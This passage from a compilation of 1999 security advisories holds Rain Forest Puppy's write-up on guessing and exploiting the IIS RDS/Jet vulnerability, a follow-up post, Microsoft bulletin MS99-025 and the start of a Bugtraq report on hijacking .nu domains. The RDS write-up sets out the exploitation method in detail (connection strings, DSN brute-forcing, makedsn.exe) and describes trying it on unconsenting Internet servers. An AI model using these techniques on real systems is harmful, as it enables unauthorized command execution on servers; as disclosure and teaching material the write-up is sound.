     earlier (thanks, Greg!). Russ Cooper did a recap, but failed to mention
     me. Microsoft's advisory acknowledged Russ and Greg as well, sans me.

     Now, I'm not an egomaniac that needs to see my name splashed over
     everything. For that matter, those of you who know me personally know how
     laid back I am concerning most issues. The point I'm trying to make is
     whether or not a name is 'unsuitable' for mention in something as flashy
     as a Russ or MS post (although side note, I must admit, Wired and ZDNet
     have lightened up to this fact, especially lately with all the Dildog and
     Orifice talk going on). If I remember correctly, David Litchfield got
     some mentions for various vulnerability findings he had. But everyone
     referenced him as David Litchfield, not 'Mnemonix', which is his hacker
     handle (BTW, greetings to Mnemonix. Thanks for serving as an example. :)
     Even lately, for those of you Bugtraq fans out there (hey, how the hell
     are you reading this, anyway!?!?!), you'll have noticed gone are the
     loveable bytes of 'Aleph1' in place of Elias Levy. Now, in Aleph1's
     defense, I can see justification of the shift. But the general fact that
     there is a need/trend for a shift is concerning me.

     The only taboo I can think of for the 'evil' of a hacker handle is the
     issue of the obvious: anonymity. Apparently I must be running around
     doing 'very bad things' (funny movie, BTW), and so I need to hide who I
     really am, right? 

     Uh, no. (For lack of a snappy comeback)

     I don't want to make this diatribe overly long, since I know you're
     only here for the exploits anyway :) But seriously, why use a handle?
     Well, there is a sense of tradition, for one. I shall not explain,
     because I think it's apparent. The other is a sense of community. If
     you're going to engage in a security discussion, why not do it with other
     security professionals. And where can you just so happen to find a large
     gaggle of people who know about security? Your local IRC server, sitting
     in #hackphreak (watch out, JP logs), #hackteach, etc. These people have
     nicknames themselves. So get yourself a nick and join in the
     conversation!

     But really, I use an alias. Does that make me evil? If I told you
     my real name, would that shift your perspective of me into the light of
     good? We'll get back to this, I want to transgress to another issue.

     I use a handle. My only collateral at this point is my name, and my
     name alone. If I find a big hole, post a research paper, etc, it adds
     nothing but perhaps an "atta'boy" to the accomplishments of my nickname.
     I've talked to people in real life and held discussions about that 'Rain
     Forest Puppy' guy, they not knowing I was Rain Forest Puppy. The
     accomplishments belong to that name, and that name alone...unless I start
     equating that name with other things. So, let's pretend I did. Let's say
     I tossed my real name out there, and got that associated with my handle.
     Now people in real life will equate the findings of Rain Forest Puppy to
     me. I can add in my company name. Now my company can ride the 'success'
     (if you will) of my findings as well, just because they're associated with
     my name. (Come on, you know these situations exist. Transmeta is cool
     just because the name 'Linus' is involved.) If I equate all kinds of
     aspects together, I can then distribute the attention (a.k.a. advertising)
     to them all as well. Think about it....if I found the next remote root
     compromise in, say, sshd, I could slap not only my handle and name but
     also my company name (Amazonian Trees, Inc) all over it! Wow, would that
     not be great marketing for Amazonian Trees, Inc, especially if it ATI's
     primary service was security related!

     But hey, it's America. We live to make money, so it seems. So why not
     do this? Right? Well, 'tis also the trend.

     Look at all the press releases on security issues. The most recent one
     was by Greg Gonzalez himself, for his company Information Technologies
     Enterprises, Inc. The press release is at

             http://www.infotechent.net/itenews.htm

     Now, what I find interesting is that Greg has made a post to NTBugtraq
     about the RDS vulnerability, yet will not release details of the
     vulnerability until next week. Hmmm. Ok, so he can't release details,
     but he can release press releases about it. Your point was made with the
     post to NTBugtraq...the point of the press release is to ride the fame to
     gain corporate exposure (which I'm equating as an excessive, corporate,
     political machine type move which isn't all that wonderful). Not to pick
     on Greg, because it's the trend. Look at WebTrends. They issued a press
     release on 'their finding of security vulnerabilities in IIS sample
     scripts' (never mind the fact that I had talked about such in a previous
     Phrack article last December). The press release is at

             http://www.webtrends.com/news/releases/release.asp?id=81

     Wow, a vendor of a security scanner using the finding of vulnerabilities
     as free marketing for their products. Well, do it where you can, right?

     I will move off this subject, because L0pht has a nice long
     composition on the matter in the Soapbox on their website, at

             http://www.l0pht.com/~oblivion/soapbox/index.html

     One interesting statement L0pht makes, going back to Greg Gonzalez and
     Russ Cooper keeping the details of the RDS vulnerability to themselves for
     a week:

             "Now we have software vendors keeping things secret. At 
              least secret for a substantial period of time. Is this 
              the way we want the industry to behave?"

     Wow, right on, brothers Mudge, Dildog, Weld Pond et al. Greetings, BTW.

     ---- Credits and Thank Yous ----------------------------------------------

     I'd like to take this brief moment to say thank you to L0pht (www.l0pht.com)
     for helping me test my perl script and taking time to review my advisory. 
     I'd also like to thank Vacuum of www.technotronic.com and Mike Dinowitz 
     of www.houseoffusion.com for their input and testing as well.

     --------------------------------------------------------------------------

     So back to the 'only a handle' thing. You have to understand that I 
     have a different perspective on it all. I publish everything under an 
     anonymous handle. What do I gain from this? Nothing personally. Nadda. 
     Zip. The handle itself may gain some fame, but not me personally. I do 
     not profit from this one way or another. What I do I do because I want 
     to, on my free time--and do it in a manner that is not greedy in any aspect.
     I don't seek to gain, and in the current setup, I really can't gain a
     whole hell of a lot. But I'm the bad guy, I forgot. It's much more
     normal to leverage a security vulnerability as a marketing tool than it is
     to just 'give' time and research away. Wow, I need to get with the Y2K I
     guess.

     Fine then. (Last tangent, then we'll get to the RDS issue, I promise :)
     So, going back to you seeing me in the light of good.... Could you better
     relate if you had a 'normal' name? Are you embarrassed to say/use 'Rain
     Forest Puppy' in conversation/publication? (Well, I mean this generically
     for all hacker handles, but I'm specifically talking about mine here)
     Would I be seen as more a security resource/less of a evil hacker if you
     had a name to associate with my handle? Well, I guess I should make that
     step. From now on, you can associate Mr. Russell F. Prigogine with the
     nick Rain Forest Puppy (Hmmm...no, the initials are not mere
     coincidence...clever, eh?). But since the big 'Russ' on campus is Russ
     Cooper, NTBugtraq moderator extraordinaire (who believes sample apps are
     not a security concern worth talking about. Real slick, Russ), I would
     prefer to have be used Mr. R.F. Prigogine (Mr. optional), if you can't--or
     don't want to--use the nick Rain Forest Puppy.

     So there. (As some would say) I sold out (oh, the horror of it). JP,
     add that to your profile database. While I gather the broken pieces of my
     dignity we'll move along to what you really want...

     - 2 - RDS Vulnerability Background

     Last Friday Greg Gonzalez (re)posted his findings of vulnerabilities
     in regards to the RDS problems originally detailed in MS98-004, which came
     out around July 16, '98. He took that issue (which is basically the
     simple fact that 'Remote Data Service' components allow *remote* access to
     your *data*....who would have thought?) and combined it with the Jet
     pipe/VBA delimiter 'feature' I discussed in my recent advisory. The
     result?

             1. You can make remote queries via RDS
             2. You can embed NT command line commands in queries

     Well, that's a pretty good combo. (side note, not to brag or anything, but
     I mention the fact that RDS can be used to do that in my ODBC advisory,
     under the title 'Msadc'). But, Greg threw in a twist which supposedly
     is the kicker:

             3. You don't need user IDs (and therefore no password required),
              does *not* require the presence of any sample Web applications 
              or example code, or even an active database

     I suppose that's a pretty big kick. Wow, no UIDs/passwords, NO SAMPLE
     SCRIPTS! Well, I guess that means Russ Cooper will let the post through
     then... (if you don't get it, go back and re-read section one).

     So Greg can do all that. And, to reiterate how dangerous this problem
     really is...


     "it...is direct, immediate, and almost 100% guaranteed
     to work....THE NUMBER OF HUGE SITES THAT ARE VULNERABLE
     IS RIDICULOUS!"
     -Russ Cooper, NTBugtraq


     "This exploit also does *not* require the presence of
     any sample web applications or example code...the
     issue affects at least 50% of the IIS servers I have
     seen"
     -Greg Gonzalez, NTBugtraq



     *** MEDIA FOLKS ***        As it seems it's fun to attach dollar loss amounts
                             advisories, I will say the potential amount of
                             damage, due to the fact that at least 50% of all
                             IIS servers Greg has seen (hopefully he's seen a 
                             lot) are vulnerable, using my sophisticated
                             reliable statistical computation method that is 
                             authoritative, I'd place damage loss somewhere in
                             the 'close to Bill Gates salary(tm)' range.



     Now, the sad part. As I mentioned before, both Greg and Russ (from this
     point on, all instances of 'Russ' refer to Russ Cooper, and not the name
     R. F. Prigogine) both know the details of this vulnerability. And yet
     they are keeping them amongst themselves until next week. Does this even
     disturb anyone? Greg says at least 50% of the IIS servers are
     vulnerable...

     DO WE WANT RUSS COOPER WITH THE KEYS TO 50% OF IIS SERVER ON THE INTERNET?

     Ok, I have a scenario that's the same in principle, but will disturb
     people even more: 

     ---- Begin same scenario ------------------------------------------------

     Rain Forest Puppy (or R. F. Prigogine, if it makes you feel better/is more
     visually pleasing) has found a hole in the latest build of Apache web
     server. There's a hole. I will announce there's a hole. I'll write up a
     few PRs as well. But I will not tell you the exact nature of it. Don't
     worry, Apache group will code a fix, and you'll be all set in a jiffy. In
     the meantime, I'm not going to release the details of the exploit of the
     hole. Instead I'm going to just keep it to myself....and my good buddies 
     Vacuum, Antilove, Stranger, and the rest of the Wiretrip and ADM crews.

     -------------------------------------------------------------------------

     Hmmm....I bet *that* disturbed you. How about a better translation:

     ---- Begin translated same scenario -------------------------------------

     I, RFP, have found a hole in Apache that I will not tell you about until
     later, but in the meantime, me and my hacker buddies will know about it!
     Nnnnnnaaaaaaayyyyyyaaaaahhhhhh! So sit back and feel helpless.

     -------------------------------------------------------------------------

     What's the difference? Only the integrity of the people involved. Again,
     a name thing perhaps. Russ Cooper, Greg Gonzalez, they're Ok. Rain
     Forest Puppy, Antilove, nope, that's scary. You don't even know if Greg
     Gonzalez isn't really a hacker that goes by 'Digital Killer'. I push for
     the point that no matter who it is in any case, it's wrong.

     Elias Levy would have told everyone the bug. :)

     NTBugtraq = moderated disclosure. Hmmm. I still like Russ's "Would
     you pay?" Administrivia from Feb 99, in which he says:

             "Someone else makes the Security Portal and you get what they
              think you need"

     As oppose to getting what Russ thinks we need instead? It all depends on
     whether or not the other guy denies posts about sample scripts....(if you
     *still* don't get it, re-read section one AGAIN).

     Ok, ok, so that RDS background turned more into a political thing.
     Well, that's because it is. At this point, Russ and Greg are have the
     keys to IIS servers. I don't know about you, but I'm not liking it. So
     I'm getting off my ass and doing something. Besides the fact that this is
     all published stuff at this point.

     Also, I may be considered 'irresponsible' for posting the exploit.
     Now, I would say *maybe* it would be debatable if I had posted *only* the
     exploit. But I have posted not only a very long diatribe, but also my
     guess of the vulnerability, which includes examples of analysis and
     theory. My hopes are to educate people on what the problem is, and how I
     went about finding it so that they can perhaps learn how to do it
     themselves. Education. It's the key, and that's what I'm trying to do.
     No, no vendor education...ADMIN education. USER education. I know I will
     probably be futile as a whole in the end, but maybe a few people will
     learn something, and that's all that matters to me.

     - 3 - *MY* Guess at Greg's RDS Vulnerability

     (I say 'guess' because I may not be right. But in any event, I
     wouldn't be writing all this unless I found something moderately
     interesting ;)

     Ok, so Greg's RDS vulnerability has three main aspects:

             1. You only need RDSServer.DataFactory component
             2. It uses Jet queries with my embedded VBA via pipes trick
             3. You don't need userIDs (and therefore no password required),
              does *not* require the presence of any sample Web applications 
              or example code, or even an active database

     Now, for those of you who don't know, RDS is basically a way to do
     remote data queries to a server. This is done over the web. Basically
     your client app communicates via HTTP to the /msadc/msadcs.dll on your
     server. The msadcs.dll exposes the RDSServer.DataFactory object, or better
     known as the AdvancedDataFactory.

     Now AdvancedDataFactory only has four methods, so we're kind of limited
     on what we can do. We can CreateRecordSet, Query, SubmitChanges, and
     ConvertToString. Query and SubmitChanges require a valid database to work
     upon. The other two are just data mangling functions. So there you have
     it, that's what we have to work with.

     I played with CreateRecordSet and ConvertToString. This actually
     relays data from the client, to the server, and back. My hopes was that
     somewhere in there I could slip one of my pipe-VBA-shells in there and do
     fun stuff. But nope, all they did was regurgitate the data in a different
     flavor. Oh well.

     SubmitChanges just basically does an elaborate UPDATE/INSERT, where it
     just syncs the server's database with the client's recordset. So that
     leaves Query.

     Well Query lets us run queries against an (existing) database. And we
     know we can embed our pipe-VBA-shells in queries, so Query looks good.
     But this is nothing spectacular. And there is one catch: the need for an
     existing database. We need to pass a DSN to the ActiveDataFactory to
     actually run the query on. The problem with the DSN is that:

             1. DSNs can require UIDs and passwords
             2. There's no way to get a list of available DSNs
                     (** through RDSServer.DataFactory functions, that
                             I'm aware of **)
             3. I'd say a DSN constitutes an 'active' database

     So DSNs blow away point 3 of our known things about Greg's RDS
     vulnerability. What if we can get around using DSNs?

     Well, we can. See, you can go the easy route by specifying "DSN=rfp",
     and then the server keeps all the internal information about that DSN,
     including driver, actually database file location (if it's a file-based
     driver), UID, password, connection parameters, etc. Well, what's fun is
     that we can directly give all that stuff in the query setup instead of a
     DSN. Let's say we setup a DSN named 'rfp' (for Rain Forest Puppy or R. F.
     Prigogine). We will use these parameters:

             DSN name 'rfp'
             Microsoft Access (Jet) driver
             c:\rfp.mdb for our database
             UID will be 'rfp'
             password will be 'prigogine'

     So by invoking "DSN=rfp", the server knows to use the Access driver on the
     c:\rfp.mdb file. DSNs are a nice tight way to precompose all that
     information. Or we can do it on the fly. Rather than issuing a "DSN=rfp"
     connect string, I can use instead:

             "driver={Microsoft Access Driver (*.mdb)}; dbq=c:\rfp.mdb;"

     This will still invoke the Access (Jet) driver, and tell it to directly
     use c:\rfp.mdb. No UID. No password. No even worrying about if/what
     DSNs exist. In the words of Cartman, "Sweet".

     That whacks out part of known point #3 (no UID or password). We're
     going to use the RDSServer.DataFactory control (known point #1), and we're
     going to use the Access driver, with fun pipe-VBA-shell features (known
     point #2). We're not using any other web sample scripts, so that cuts out
     another portion of known point #3. Oh, we're so close...can you taste it?
     (and what does it taste like? chicken?)

     There's still one minor detail. Notice we have to specify the 'dbq='
     parameter in the connection setup. And this needs to be a valid file. If
     it's not, the SQL engine on the server side will fail and return errors
      before it even gets around to looking at our queries. But damn, we need
      an .mdb file to connect to. Well, if you look in the Access ODBC
      reference on Microsoft's website (which sucks, half the links were broken at
      various moments through the night while sifting through it...go MS. I
      don't blame you though--you probably engineered your site/servers with
      Microsoft products, and that explains it right there) you will see that
      you can pass a CREATE_DB parameter to the Access driver. This will cause
      the driver to construct a valid (empty) .mdb file. Woohoo! (not to 
      be confused with w00w00; the former is an expression of joy, the latter is
      a cool group of guys that I had the fortune of hanging out with at DefCon)
      So in our connection setup we pass a "CREATE_DB=c:\rfp.mdb" attribute with
      everything else and low and behold, it...... <to be continued...>

     <continued from above> ...didn't work. Damn. The problem was that it
     was passing the CREATE_DB parameter during the SQLDriverConnect() phase,
     and that just isn't going to cut it. We need to issue a
     SQLConfigDataSource() call (I think that was it...my mind is a mush of
     ODBC/SQL/RDS/ADO/OLEDB/FMP API right now) to get CREATE_DB to do it's
     thing, and RDSServer.DataFactory.Query just wasn't going to give us love.
     So, after struggling with other nuances and ideas, I concluded that I
     couldn't make a DSN, or a .mdb from scratch using Access SQL via
     RDSServer.DataFactory without connecting to a database/.mdb beforehand.

     (**NOTE: if you know how this can be done, EMAIL ME! I WILL TRADE YOU
             0DAY! :) rfp@wiretrip.net )

     Well damn, so we need a database to make this work. Any 'ol database
     will do (hell, even the WINS or DHCP .mdb should work >:). But
     unfortunately, none come by default on a standard NT install. Bummer.
     But wait....all is not lost....

     It seems when you do a 'typical' or better install with Option Pack 4,
     a particular .mdb is installed...namely the btcustmr.mdb which is
     installed to %systemroot%\help\iis\htm\tutorial\. Microsoft saves the
     day! They're just so damn efficient at helping us hack their own
     product...

     To get IIS 4.0 you practically need to install Option Pack 4, which
     will also then install MDAC 1.5--this is good. Let's just hope they
     didn't pick the 'minimal' install... The last catch is that we need to
     figure out what %systemroot%. On the majority of the systems it will
     probably be c:\winnt, d:\winnt, e:\winnt, or f:\winnt (don't laugh, mine
     is f:). I guess some wacko might do \win, \windows, \nt, and if you
     upgrade it may be \winnt351 or \winnt35. Well, we can do a little 'brute
     force' on all those combinations until one works. Oh, and no, you can't
     do "dbq=%systemroot%\help\iis\htm\tutorial\btcustmr.mdb"...the SQL driver
     pukes.

     So that's my guess! Mr. Gonzalez is using a connection string similar to

             "driver={Microsoft Access Driver (*.mdb)};
                     dbq=c:\winnt\help\iis\htm\tutorial\btcustmr.mdb;"

     with a query that contains one of the pipe-VBA-shell commands. Now, I
     think this technically meets all the known points of the exploit--the only
     fuzzy one is where Greg mentions "no need of an *active* database". Now,
     I may be reading into it, but btcustmr.mdb is hardly active. It's a
     totally unused .mdb sitting in a directory most people probably didn't
     know existed.

     Just to double check, I did a quick little test...and six of the ten
     servers I picked off the Internet were susceptible to this method. That'd
     a tad better than Greg's 50%, but I had a small population sample, so I'll
     give him the benefit of the doubt.

     Now, I obviously could be wrong. Maybe Greg found a way to create the
     .mdb, or some other way where he doesn't need to rely on the existence of
     btcustmr.mdb. I'm not claiming to be a SQL/database wiz--actually, I hate
     database applications. Period. They're gross. But I put up with it for
     the better good of the Internet. :) But yes, I could be wrong, and I'm
     willing to admit it.

     Let me also mention the contenders. They were contenders, but
     definitely did not make the final round because as much as the 'look' and
     'smelled' exploitable, I couldn't get them to crack:

     1. Data Shape Provider. This already has hooks into the VBA
     interpreter ( you can put VBA commands in the CALC() function--except it
     lacks shell()), and is a primary suspect in my eyes. The bonus is that
     you do *not* need any database files to use this. Well, barring the fact
     that I really don't know what I'm doing, I played around with it trying to
     feed some pipe-VBA-shells to it and whatnot, but couldn't get anything
     interesting to happen. Now, this is installed by default, has VBA hooks
     already, doesn't need a database, etc. I say this fits the description
     more that the btcustmr.mdb thing. And it's just all together 'cooler'.

     2. Index Server Provider. Now, not all places use Index Server, so I
     highly doubted this was the route, but it is a contender. Again, you
     don't need a database file, so that's a bonus. I tried the usual
     pipe-VBA-shell commands, but no go either.

     If I really had to choose, I'd say the exploit was in the Data Shape
     Provider (which Microsoft also warned of in the advisory). But since I
     couldn't get it to give me love, I went with btcustmr.mdb.

     - 4 - Bonus Aspects of My Version of the Exploit

     So, yes, I could be wrong. But I figure why not just feature pack this
     exploit to *really* kick some ass? Well, so, I wasted a few brains cells
     (the things I do for you people...jeez) and thought of some good things to
     toss into the code. I figure hey, might as well make this a useful tool!

     The first one is pretty obvious. There are many applications on the
     market, that would be used on a server, that would make/require a DSN.
     For instance Cold Fusion creates a few DSNs, as does iHTML. Some of the
     sample apps that come with IIS create DSNs as well, and the MDAC makes a
     few too. All these potential DSNs. Remember, it only takes one DSN to
     work. So if we wanted to, we could scan to see if any of a number of
     default DSNs exist, and if they do, exploit them.

     An extension of this would be user created DSNs. Again, all we need is
     the DSN name, so we can scan for what are 'psychologically' common DSN
     names. For instance test, web, data, database, www, db, and sql are
     common type DSN names. Basically, if you supply a dictionary file of DSN
     names you want to use, the exploit will sit there and brute force, a la a
     remote password cracker on the DSN names.

     Of course, we'd need DSNs with the Access Driver. But what's nice
     is that if we connect to a valid DSN with an invalid SQL query, we'll get
     back the name of the driver in the error message. So it's a nice way to
     check.

     Then we can also do an inverse type thing--instead of looking for
     common DSNs to connect to, we can look for common .mdbs to connect to.
     For instance MS Cert Server, DHCP, and WINS all use .mdbs, as well as
     particular sample scripts, SDKs, etc. We can just try to connect to them
     directly. If we find one, rather than dealing with the table information
     within the .mdb, we can just CREATE TABLE on it first, and then exploit
     the table we just created. Very simple. 

     Another interesting feature is dumping the root scope paths from Index
     Server. Basically it's a query of "Select paths from scope()". This is
     useful because it can provide us with useful directory information...since
     one of the tricky problems is determining location of html files and
     systemroot (although they're most likely guessable, that's not always the
     case). So I tossed this in for kicks, although it doesn't run 'inline'
     with the actually exploit checks. You invoke this functionality
     separately.

     The last extra functionality, but the easiest of them all, is to see if
     /scripts/tools/makedsn.exe exists on the webserver. If it does, we can
     make a DSN and define the .mdb file to use, and then exploit it right
     away. In my particular exploit I make a DSN named 'wicca'. (Greetings to
     Simple Nomad! I wish you could have been around at DefCon. Next time.)

     So, wow. Lots of ways to get a database connection. My RDS exploit
      tries them in the following order, continuing until successful:
      
      - try raw driver connect to btcustmr.mdb
      - try to create a DSN with /scripts/tools/makedsn.exe
      - look for common DSNs
      - look for common .mdbs
      - try 'dictionary' attack on user DSNs
      
      And separately you can query Index Server to get the paths information
      (Warning: this could be a lot of information! The script automatically
      sorts out common directories).
      
      ----- Campaign solicitation --------------------------------------------
      
      XOR!! The unofficial AES candidate!
      
      There are many reasons why you should support XOR:
      1. It's mad fast!
      2. It can be implemented in very little code
      3. It will run with decent performance even on the meekest of 
      Casio watches
      4. The ciphertext doesn't look like the plaintext--this is good.
      5. Stream, block, chained, unchained, XOR does it all!
      6. So many companies already use it as their encryption algo of choice!
      
      So join the 'AES XOR y2k == 8w8' campaign today!
      
      ------------------------------------------------------------------------
      
      One interesting feature that's almost necessary is a 'resume' mode.
      Imagine you just scanned a webserver, spending the last 5 minutes trying
      all the combinations of valid default .mdbs, valid DSNs, etc. Finally it
      cracks and you get one, and you run your command. Well, what if you want
      to run another command? Do you have to go through that rigmarole again?
      Well, not with my script. :) When you make a successful connection, it
      writes out a file called 'rds.save'. Then, you can just use the 'resume'
      switch (-R), with no other options. It will read in rds.save, and let you
      run a command against the successful connection again right away.
      
      Sound good so far? Ok, I'll briefly go through the command line 
      options.
      
      - 5 - Command Line Options
      
      To run the program, just save this whole advisory to a file, such as 
      msadc.pl. Then run "perl -x msadc.pl". Perl is smart and will figure out
      how to run the exploit at the end. No need to cut and paste. :)
      
      Ok, the command switches are as follows:
      
      -h <ip or domain>        this is the host to scan. You MUST either
       use either -h or -R.
      
      -d <value 0-?>                this is the delay between connections.
       Value is in number of seconds. I added
       this because hammering the RDS components
       caused the server to occasionally stop
       responding :) Defaults to 1. Use -d 0
       to disable.
      
      -v                        verbose. This will print the ODBC error
       information. Really only for
       troubleshooting purposes.
      
      -e                        external dictionary file to use on step
       5--the 'DSN dictionary guess' stage. The
       file should just be plaintext, one DSN
       name per line file with all the DSN names
       you want to try. Quite honestly a normal
       dictionary file won't do you much good.
       You can probably do pretty damn well with
       a few dozen or two good ones, like 'www',
       'data', 'database', 'sql', etc.
      
      -R                        resume. You can still specify -v or -d
       with -R. This will cause the script to
       read in rds.save and execute the command
       on the last valid connection.
      
      -X                        perform an Index Server table dump instead.
       None of the other switches really apply
       here, other than -v (although -d still
       works, there's no need to slow down one
       query). This dumps the root paths from
       Index Server, which can be rather lengthy.
       I suggest you pipe the output into a file.
       Also, if there is a lot of return
       information, this command may take a while
       to complete. Be patient. And I don't
       suggest you use this command more than
         once a minute...it caused my P200 w/
                                     128 RAM to stop answering requests, and
                                     in general borked inetinfo.exe. If you do
                                     decide to CONTROL-C during the middle of the
                                     data download the script will save all 
                                     received data into a file called 'raw.out',
                                     so you don't loose everything you've 
                                     already received. NOTE: this is the raw 
                                     data, which is in Unicode. 

     - 6 - Random Q & A

     - "This or that function of the script is broken"
     -- Well, it wasn't broken when I used it, so you must of broke it.
             No, seriously. I've tested it on Linux, L0pht tested it on
             Solaris, and Vacuum tested it on NT (using Perl 5.005-03 for 
             Windows). They worked for us. I've coded some various checks
             for errors, but nothing robust. But I know it worked for me. :)

     - "Why don't you code this in C?"
     -- Because I've been programming C/C++ for 8 years. I'm tired of it. 
             I've been coding perl for 3, so it's new and fresh, and I'm just
             now starting to do interesting stuff. Plus the code is portable
             this way. Come on, where else can you have a piece of code that
             does network/socket level stuff that runs on NT, Linux, and Solaris 
             with no changes??!?

     - "Or you going to port this to C?"
     -- It wouldn't be that hard at all, but wasn't planning on it. You have
             something against perl?

     - "What's the F in Russell F. Prigogine stand for?"
     -- Fabio. Fear the geese.

     - "Why do you act like this is a joke?"
     -- Because I don't get paid for doing this, I don't get donations, and I
             don't get any sexual gratification from this what-so-ever. I
             do this because I *like* to, because it's *FUN*--so damn it,
             I'm having fun!

     - "I don't get some of the jokes in the paper. Like what's FMP?"
     -- If you have to ask, you wouldn't understand. This advisory is
             teeming with inside jokes. RFP, FMP.

     - 7 - Signoff

     Ok, I've been coding the exploit, reading MS database propaganda (did I
     mention yet I hate database stuff?), and writing this damn advisory for a 
     collective of 30 hours. About time I stop and never think about it again.
     :)

     So you have my best shot at the RDS exploit, even though I think there may
     be something pretty nifty hiding in the Data Shape Provider (or maybe
     Index Server). We'll just have to wait and see if/when Greg and Russ
     finally decide they can share their toys.

     Remember, I spent 2 days typing all this in an attempt to teach people
     something, rather than to just release the vanilla exploit. So if you
     want to label me irresponsible, well, I suppose I could have been more so.
     Moreover, I support eEye in what they did 100%. Russ says "there are
     numerous unwritten rules when it comes to security disclosures". Rules?
     Unwritten? Well, maybe eEye was unaware of these rules, since they're not
     written down. 

     Future updates to this advisory and exploit code will be posted to

             www.technotronic.com/rfp/ 

     Well, it's been fun. Until the next release (which may be sooner than
     you think ;)

             *** SPECIAL THANKS once again to Mudge and Weld from 
             www.l0pht.com for helping me out on the preliminary 
             assessment, and Mike Dinowitz from www.houseoffusion.com 
             and Vacuum from www.technotronic.com for creative input.


              Time is creation. The future is just not there.

     Subject Update to ODBC/RDS vulnerabilities
     Date:   Tue Sep 21 1999 12:07:54
 
     Hello all,
 
     It's been a while since I've posted anything, and I promise it will be
     short this time. ;)
 
     Microsoft has released a patched Jet ODBC engine that will fix the ODBC
     problem as well as Mr. Cuartango's Excel vulnerabilities as well.
     Basically, this is a 3.51 engine retrofitted with a 'sandbox' restriction
     controlled by the following registry key:
 
     \\HKLM\Software\Microsoft\Jet\3.5\Engines\SandboxMode
 
     Also, as for the RDS problem, they recommended implementing custom
     handlers to limit invocation of the RDS component to legit uses. Custom
     handler support is controlled by the following registry key:
 
     \\HKLM\Software\Microsoft\DataFactory\HandlerInfo\handlerRequired
 
     Now, perhaps it's just me, but on three different NT boxes I have, which
     are various SP3 and 5 combos on NT4, patches installed as administrator,
     the permissions on these registry keys are Everyone -> Special Access,
     which includes Set Value. This basically means domain users can remotely
     disable handler and sandbox restrictions by changing the values of these
     keys. Hmmm. I've tested this, and it worked as expected.
 
     Also, Mnemonix pointed out an interesting aspect which I overlooked for
     the RDS vulnerability that really makes it more evil. The current
     limitation to the RDS exploit is that it requires a local file to 'attach'
     to, specifically a .mdb. Well, you can use UNC addresses for this file,
     so if you setup a Windows share on the internet, you can request your file
     off that, therefore bypassing the need for a local file. I've tested
     this, and it works as well.
 
     I am finishing updates to my RDS exploit program, which I'll probably
     release in the next week. It will implement all of this, plus clean up
     the code a bit.
 
     Also, I wanted to point out an ommision of credit in the RDS advisory.
     Matthew Astley, who I co-wrote the May 25th advisory with the original
     ODBC info, should have been given credit as well for the ODBC/Jet pipe
     problem. Apologies to Matthew.

     Re-Release: Unauthorized Access to IIS Servers through ODBC Data Access
     with
     RDS

     Originally Released as MS98-004: July 17, 1998
     Re-Released as MS99-025: July 19, 1999
     Revised: July 23, 1999

     Summary
     =======
     Microsoft has identified a vulnerability in Microsoft(r) Data Access
     Components (MDAC) that could allow a web site visitor to take unauthorized
     actions on a web site hosted using Internet Information Server. The
     vulnerability can be eliminated by reconfiguring or removing the affected
     components of MDAC.


     This vulnerability originally was reported in Microsoft Security Bulletin
     MS98-004, issued July 17, 1998. It was re-released on July 19, 1999, to
     remind customers of the need to address the vulnerability. It was updated
     on
     July 23, 1999, to discuss the need to remove sample files that are
     affected
     by the vulnerability, and to clarify that MDAC 2.0 is affected even if
     deployed as a clean installation.


     Frequently asked questions regarding this vulnerability can be found at
     http://www.microsoft.com/security/bulletins/MS99-025faq.asp. The FAQ
     contains instructions for eliminating the vulnerability.

     Issue
     =====
     The RDS DataFactory object, a component of Microsoft Data Access
     Components
     (MDAC), exposes unsafe methods. When installed on a system running
     Internet
     Information Server 3.0 or 4.0, the DataFactory object may permit an
     otherwise unauthorized web user to perform privileged actions, including:
      - Allowing unauthorized users to execute shell commands on the
        IIS system as a privileged user.
      - On a multi-homed Internet-connected IIS system, using MDAC to
        tunnel SQL and other ODBC data requests through the public
        connection to a private back-end network.
      - Allowing unauthorized accessing to secured, non-published
        files on the IIS system.

     Affected Software Versions
     ==========================
     The vulnerability affects the Microsoft Data Access Components, when
     installed on a web server running Internet Information Server 3.0 or 4.0.
     Specifically:
      - MDAC 1.5 and 2.0 are affected
      - MDAC 2.1 is affected if installed as an upgrade from a
        previous version of MDAC, rather than a clean installation
      - Any version of MDAC is affected if Sample Pages for RDS are
        installed.

     NOTE: Sample Pages for RDS are provided as part of the Windows 4.0 Option
     Pack and the MDAC 2.0 Software Development Kit. They are not installed by
     default in the Option Pack, but are installed by default in the MDAC 2.0
     SDK.

     NOTE: MDAC 1.5 and IIS are installed by default installations of the
     Windows
     NT 4.0 Option Pack.

     NOTE: IIS can be installed as part of other Microsoft products, such as
     Microsoft BackOffice and Microsoft Site Server. MDAC can be installed as
     part of other Microsoft products, such as Visual C and Microsoft Office.

     Patch Availability
     ==================
     This vulnerability requires a configuration change to eliminate it,
     rather than a patch. Details of the specific changes needed are available
     at

     http://www.microsoft.com/security/bulletins/MS99-025faq.asp.

159.0 Hijack any .nu domain box (DoS/redirection/hijack)
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      From: Shane Wegner <shane@CM.NU>
      To: BUGTRAQ@netspace.org
      Subject: Possible DOS attack in the .nu domain service
      
      Hello all,
      
      I am not sure if this is known or even relevant to the list and if not,
      please excuse this post.
      
      There appears to be a bug in the niu DNS setup process which could result
      in a DOS attack for those using their domains.  For those unfamiliar with
      niu, they provide sub-domain service under the .nu domain to machines
      which do there own DNS.  I have written to them on several occasions about
      this issue but as of yet have received no response.
      
      OK the bug is that any user who is willing to pay the $25 to register a
      .nu domain can knock out or redirect a host under another.  This is best
      shown through an example.
      
      I register mycompany.nu and in the registration form enter the hosts I
      have doing the DNS for it.
      
      Name: mycompany.nu
      DNS1: machine.someserver.com
      DNS2: machine2.someserver.com
      
      After this step, my DNS entry in the .nu table looks like this
      
      $ORIGIN nu.
      mycompany       IN      NS      machine2.someserver.com.
                      IN      NS      machine2.someserver.com.
      
      mycompany.nu for the sake of this example had the following DNS table.
      
      $ORIGIN nu.
      mycompany       IN      SOA     mymachine.mycompany.nu. hostmaster.mycompany.nu. (
                      1 301 120 604800 600 )
                      IN      NS      machine1.someserver.com. 
                      IN      NS      machine2.someserver.com.
      $ORIGIN  mycompany.nu.
      mymachine       IN      A       192.168.1.1
      
      So Al's well until someone registers evil.nu with the goal of knocking out
      myserver.mycompany.nu.  On the form, they enter the following.
      
      name: evil.nu
      DNS1: mymachine.mycompany.nu
      DNS1IP: 127.0.0.1
      
      Now here's the bug, if you enter an IP for a machine which falls under the
      .nu name-space, it maps it statically.  It does not check to see if it
